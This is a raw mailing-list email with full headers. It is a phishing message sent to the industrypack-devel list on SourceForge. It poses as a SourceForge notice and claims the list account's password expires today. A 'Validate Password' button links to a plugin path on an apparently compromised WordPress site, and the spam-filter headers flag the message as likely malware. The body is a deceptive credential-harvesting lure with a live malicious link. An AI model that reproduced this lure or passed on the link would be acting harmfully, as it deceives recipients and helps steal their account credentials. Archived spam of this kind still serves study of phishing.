Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 188453F2E67
	for <lists+industrypack-devel@lfdr.de>; Fri, 20 Aug 2021 16:50:20 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.92.3)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mH5qc-00076h-RQ
	for lists+industrypack-devel@lfdr.de; Fri, 20 Aug 2021 14:50:18 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 (envelope-from <paganettit@thermacell.net>) id 1mH5qb-00076Z-BT
 for industrypack-devel@lists.sourceforge.net; Fri, 20 Aug 2021 14:50:17 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=j/u5jGW06ySxHb0wlMvjNYsH3Ri1IWKFUhrC7pjWD60=; b=jkuiBCXQt3DaiZ5TfNap+6Bpxg
 VPOdPc52uzR57+5Cd8YD+yIpV5FELKxtk9PVjJkC5g6ZiFeDnGjCAZqWIhKpFU5XrrOGo7wXpo6uN
 5i0DAh2F1qU2Ro7njkEqfWba9CPI5LuvUE5jZa3MVPwF43Aoxcg8n8hEZNDTOD7qkcIk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=j/u5jGW06ySxHb0wlMvjNYsH3Ri1IWKFUhrC7pjWD60=; b=E
 H2VrlJZ/TAm4mtHp/2jq8utyhwA4y28/GQTyP+yKHPRD5R54YbryD1GUf8THhiYRP8ZJXcFGPVKcY
 cJ/40KvBl8EmqPzZf5Z06vnc95zzkF5rDabj2nLpFz5vTRhFiMdFAhZiDKctX7fE4r5+ieGG6Ut6U
 00DsK32lTX1lETzw=;
Received: from [206.189.150.216] (helo=mta0.pianoplywood.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mH5qX-0001Yt-0y
 for industrypack-devel@lists.sourceforge.net; Fri, 20 Aug 2021 14:50:17 +0000
From: lists.sourceforge.net<paganettit@thermacell.net>
To: industrypack-devel@lists.sourceforge.net
Date: 20 Aug 2021 07:29:54 -0700
Message-ID: <20210820072954.811AEB3F712FB864@thermacell.net>
MIME-Version: 1.0
X-Spam-Score: 8.0 (++++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: dauperu.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 2.5 URI_WP_HACKED_2        URI for compromised WordPress site, possible malware
X-Headers-End: 1mH5qX-0001Yt-0y
Subject: [Industrypack-devel] lists.sourceforge.net : Termination Scheduled
 8/20/2021 7:29:54 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3296021199442066643=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3296021199442066643==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html>
<head>
</head>
<body>&nbsp;</body>
<br />
<meta content=3D"text/html; charset=3Diso-8859-1" http-equiv=3D"Content-Typ=
e" /><body<div class=3D"gmail-_1Lo7BjmdsKZy3IMMxN7mVu">
<title></title>
</body<div>
<div>
<div class=3D"gmail-rps_5ab9">
<div align=3D"center">
<div style=3D"HEIGHT: 394px; WIDTH: 81.35%; BACKGROUND-COLOR: rgb(233,233,2=
33)">
<p align=3D"center"><span style=3D"font-size:24px;"><span style=3D"color:#0=
000FF;">lists.sourceforge.net</span></span></p>

<p align=3D"center"><span style=3D"font-size: large;">Your password for&nbs=
p;</span><font color=3D"#0000f4" style=3D"font-size: large;">industrypack-d=
evel@lists.sourceforge.net</font><span style=3D"font-size: large;">&nbsp;is=
 due to expire today 8/20/2021 7:29:54 a.m.</span></p>

<p align=3D"center"><font size=3D"4">Click on the link below to&nbsp;keep a=
ccount active</font>&nbsp;</p>

<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" height=3D"33" style=
=3D"BORDER-COLLAPSE: collapse" width=3D"146">
	<tbody>
		<tr style=3D"FONT-SIZE: 0px">
			<td style=3D"FONT-SIZE: 14px; HEIGHT: 20px; FONT-FAMILY: &quot;Segoe UI&=
quot;, &quot;Segoe UI&quot;, Tahoma, Arial, sans-serif; COLOR: rgb(255,255,=
255); BACKGROUND-COLOR: rgb(0,120,215)" width=3D"144">
			<p style=3D"TEXT-ALIGN: center"><strong><a href=3D"https://dauperu.com/c=
ongreso2017/wp-content/plugins//masterx/hp/english#industrypack-devel@lists=
=2Esourceforge.net" rel=3D"noopener noreferrer" target=3D"_blank"><font col=
or=3D"#ffffff">Validate Password</font></a></strong></p>
			</td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>

<p align=3D"center"><font size=3D"4">We respect your privacy.</font></p>

<p align=3D"center"><font size=3D"4">lists.sourceforge.net</font></p>

<p align=3D"center">&nbsp;</p>
</div>
</div>
</div>
</div>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>
</html>


--===============3296021199442066643==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3296021199442066643==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3296021199442066643==--
